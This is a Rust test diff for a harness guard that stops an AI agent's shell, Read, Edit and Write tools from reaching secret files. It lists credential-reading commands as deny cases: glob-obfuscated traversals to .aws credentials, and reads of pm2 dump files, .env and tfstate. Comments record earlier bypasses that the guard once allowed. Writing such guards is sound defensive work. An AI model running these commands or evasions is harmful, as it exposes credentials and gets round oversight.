+    fn denies_a_traversal_hidden_from_the_prefix_check_7557() {
+        for command in [
+            "for f in feat/.?/secrets/prod-credentials; do cat $f; done",
+            "for f in feat/.[.]/secrets/prod-credentials; do cat $f; done",
+            "for f in docs/.*/.aws/aws-credentials; do cat $f; done",
+            "git branch docs/.*/.aws/aws-credentials",
+            "git checkout -b feat/.?/secrets/prod-credentials",
+            "for f in ../x=feat/db-credentials; do cat $f; done",
+            "for f in /etc/x:feat/db-credentials; do cat $f; done",
+            // Error arm: a segment that does not lex opens no position at all,
+            // so no exemption is reachable and the raw scan denies.
+            "for f in 'feat/x-credentials; do cat $f; done",
+        ] {
+            assert!(eval(command).is_some(), "`{command}` must deny");
+        }
+        // The whole-token rule is what refuses the cut fragment; the refspec
+        // split is what keeps a `src:dst` push allowed.
+        let word = "feat/db-credentials";
+        assert!(!exempt_in_word_position(
+            "../x=feat/db-credentials",
+            word,
+            WordPosition::WordList
+        ));
+        assert!(!exempt_in_word_position(
+            "/etc/x:feat/db-credentials",
+            word,
+            WordPosition::WordList
+        ));
+        assert!(exempt_in_word_position(
+            "HEAD:feat/db-credentials",
+            word,
+            WordPosition::RefName
+        ));
+        assert!(exempt_in_word_position(word, word, WordPosition::WordList));
+        for command in [
+            "git push origin HEAD:feat/7527-tm-secrets-skill",
+            "git push origin :docs/secrets-plan",
+            // A ref PATTERN in a ref position keeps its glob.
+            "git branch --list 'docs/secrets*'",
+        ] {
+            assert_eq!(eval(command), None, "`{command}` must allow");
+        }
+    }
+
+    /// The structural rule every position exemption routes through (#7557).
+    #[test]
+    fn a_well_formed_ref_name_follows_check_ref_format_7557() {
+        for ok in [
+            "feat/x-secrets",
+            "refs/remotes/origin/docs/secrets-plan",
+            "release/v1.0-token-refresh",
+        ] {
+            assert!(is_a_well_formed_ref_name(ok), "{ok}");
+        }
+        for bad in [
+            "",
+            "@",
+            "feat/../secrets",
+            "feat/./x",
+            "feat/.?/x",
+            "feat/.*/x",
+            "feat/.aws/x",
+            "feat/x..y",
+            "feat//x",
+            "/feat/x",
+            "feat/x/",
+            "feat/x.",
+            "feat/x.lock",
+            "feat/x@{1}",
+            "feat/~x",
+            "feat/x^",
+            "feat/a:b",
+            "feat/*",
+            "feat/x?",
+            "feat/[x]",
+            "feat\\x",
+            "feat/{a,b}",
+            "feat/a b",
+        ] {
+            assert!(!is_a_well_formed_ref_name(bad), "`{bad}` is not a ref name");
         }
     }
 
@@ -2741,9 +2537,10 @@ mod tests {
     fn allows_every_tool_that_prints_no_file_bytes() {
         // `Grep` is deliberately absent from this list since #7266's fix round:
         // it is the second native tool that prints file bytes, so it has its
-        // own arm above rather than a blanket allow.
+        // own arm above rather than a blanket allow. #8483: so are `Edit`,
+        // `MultiEdit` and `Write`, which reach the same file's content.
         let input = serde_json::json!({"file_path": "/repo/.env"});
-        for tool in ["Write", "Edit", "Bash", "Glob", "Task"] {
+        for tool in ["Bash", "Glob", "Task"] {
             assert_eq!(evaluate_secret_file_read_tool(tool, Some(&input)), None);
         }
         assert_eq!(evaluate_secret_file_read_tool("Read", None), None);
@@ -2751,6 +2548,69 @@ mod tests {
             evaluate_secret_file_read_tool("Read", Some(&serde_json::json!({"file_path": ""}))),
             None
         );
+    }
+
+    /// 🔴 REGRESSION (#8523): pm2's dump holds every managed process's env and
+    /// was read with `python3 json.load`. Every deny row ALLOWED on `c3c63e72f`.
+    #[test]
+    fn denies_a_pm2_dump_read_8523() {
+        for command in [
+            "cat ~/.pm2/dump.pm2",
+            "python3 -c 'import json; print(json.load(open(\"/Users/x/.pm2/dump.pm2\")))'",
+            "jq . ~/.pm2/dump.pm2.bak",
+            "cat ~/.pm2/*",
+        ] {
+            let reason = eval(command).unwrap_or_else(|| panic!("`{command}` must deny"));
+            assert!(reason.contains("dump.pm2"), "{reason}");
+        }
+        let read = serde_json::json!({"file_path": "/Users/x/.pm2/dump.pm2"});
+        assert!(evaluate_secret_file_read_tool("Read", Some(&read)).is_some());
+        for command in [
+            "ls -la ~/.pm2/dump.pm2",
+            "tail -n 50 ~/.pm2/logs/api-out.log",
+            "pm2 list",
+        ] {
+            assert_eq!(eval(command), None, "`{command}` must allow");
+        }
+    }
+
+    /// 🔴 REGRESSION (#8483): an `Edit`, `MultiEdit` or `Write` on a
+    /// secret-bearing file is judged by the same predicate as `cat` of it, and
+    /// allowed by the same exemptions. All three ALLOWED on `c3c63e72f`.
+    #[test]
+    fn judges_an_edit_or_write_like_a_bash_read_8483() {
+        for path in [
+            "/repo/infra/prod.tfvars",
+            "/repo/.env",
+            "/repo/terraform.tfstate",
+        ] {
+            assert!(eval(&format!("cat {path}")).is_some(), "cat {path}");
+            let input = serde_json::json!({"file_path": path, "content": "x"});
+            for tool in ["Edit", "MultiEdit", "Write"] {
+                let reason = evaluate_secret_file_read_tool(tool, Some(&input))
+                    .unwrap_or_else(|| panic!("{tool} {path} must deny"));
+                assert!(reason.contains(&format!("the `{tool}` tool")), "{reason}");
+                assert!(reason.contains("#7266"), "{reason}");
+            }
+        }
+        // The Bash read's own exemptions carry over: a placeholder dotenv, an
+        // SSH public key and an ordinary source file whose name carries a
+        // word family all stay editable.
+        for path in [
+            "/repo/.env.example",
+            "/home/u/.ssh/id_rsa.pub",
+            "/repo/src/token_store.rs",
+        ] {
+            assert_eq!(eval(&format!("cat {path}")), None, "cat {path}");
+            let input = serde_json::json!({"file_path": path});
+            for tool in ["Edit", "MultiEdit", "Write"] {
+                assert_eq!(
+                    evaluate_secret_file_read_tool(tool, Some(&input)),
+                    None,
+                    "{tool} {path}"
+                );
+            }
+        }
     }
 
     #[test]
